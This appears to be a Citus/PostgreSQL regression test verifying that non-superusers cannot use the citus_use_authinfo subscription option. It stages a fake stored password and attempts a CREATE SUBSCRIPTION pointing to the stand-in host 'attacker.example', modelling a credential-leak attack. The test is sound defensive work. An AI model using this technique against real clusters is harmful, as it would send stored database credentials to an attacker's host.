-- non-superusers must not be able to use citus_use_authinfo
SET citus.enable_ddl_propagation TO off;
CREATE ROLE authinfo_test_user;
CREATE ROLE authinfo_test_target;
-- pg_create_subscription exists only on PG16+; the check fires either way
DO $$
BEGIN
    IF EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'pg_create_subscription') THEN
        EXECUTE 'GRANT pg_create_subscription TO authinfo_test_user';
    END IF;
END $$;
GRANT CREATE ON DATABASE regression TO authinfo_test_user;
INSERT INTO pg_dist_authinfo (nodeid, rolename, authinfo)
VALUES (0, 'authinfo_test_target', 'password=do_not_expose');
RESET citus.enable_ddl_propagation;
SET ROLE authinfo_test_user;
CREATE SUBSCRIPTION authinfo_test_sub
CONNECTION 'host=attacker.example port=65432 user=authinfo_test_target dbname=regression'
PUBLICATION pub_01
WITH (citus_use_authinfo = true, connect = false, enabled = false,
      create_slot = false, copy_data = false, slot_name = NONE);
RESET ROLE;
DELETE FROM pg_dist_authinfo WHERE rolename = 'authinfo_test_target';
SET citus.enable_ddl_propagation TO off;
REVOKE CREATE ON DATABASE regression FROM authinfo_test_user;
DROP ROLE authinfo_test_user, authinfo_test_target;
RESET citus.enable_ddl_propagation;
